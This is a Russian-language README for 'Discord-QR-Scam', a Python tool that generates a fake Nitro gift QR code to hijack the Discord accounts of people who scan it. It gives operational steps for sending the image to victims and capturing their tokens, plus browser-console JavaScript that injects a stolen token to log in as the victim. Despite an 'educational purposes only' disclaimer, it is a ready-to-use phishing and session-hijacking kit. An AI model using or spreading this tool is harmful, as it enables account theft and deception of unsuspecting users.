# Discord-QR-Scam

## Отказ от ответственности
Автор не несет ответственности за точность, полноту или качество предоставленной информации. Используйте последующую информацию на свой страх и риск.
Используйте предоставленую информацию только в образовательных целях.

## Информрация
Python скрипт, который автоматически генерирует QR-код Nitro и получает токен пользователя Discord при сканировании. Этот инструмент демонстрирует, как люди могут обмануть других
в сканирование своего QR-кода для входа в Discord и получения доступа к своей учетной записи.

## Использование
1. Если у Вас не установлен Python, загрузите Python 3.7.6. и убедитесь, что вы выбрали опцию `Add Python 3.7.6 to PATH` во время установки.
2. Установите необходимые модули > `pip install -r requirements.txt` или дважды кликните по `install.cmd`
3. Запустите `python qr_generator.py` в командной строке или двойной клик `run.cmd`
4. Подождите, пока `discord_gift.png` будет сгенерирован. Отправьте изображение пользователю и попросите отсканировать его.
5. QR-код действует всего около 2-х минут. Убедитесь, что Вы отправляете пользователю новый QR-код который готов к сканированию.
6. Когда QR-код будет отсканирован, Вы автоматически войдете в учетную запись Discord, и получите токен Discord.

## Вход
1. Откройте ваш браузер
2. Перейдите на https://discord.com/login
3. Нажмите F12 (или Ctrl + Shift + I)
4. Выберите вкладку `Console` и вставьте нижеуказанный код
```
function login(token) {
  setInterval(() => {
    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
  }, 50);
  setTimeout(() => {
    location.reload();
  }, 2500);
}
login('TOKEN');
```
5. Замените слово `TOKEN` токеном пользователя и нажмите `ENTER`

## Устранение неполадок
Убедитесь, что Ваш файл chromedriver.exe имеет ту же версию, что и текущая версия веб-браузера Chrome. Чтобы проверить текущую версию Chrome,
вставьте `chrome://settings/help` в Google Chrome.

Если хром зависает:
1. Убедитесь, что Ваш файл chromedriver.exe имеет ту же версию, что и версия веб-браузера Chrome.
2. Загрузите последнюю версию chromedriver.exe здесь: https://chromedriver.chromium.org/downloads
3. Затем замените файл chromedriver.exe в папке.
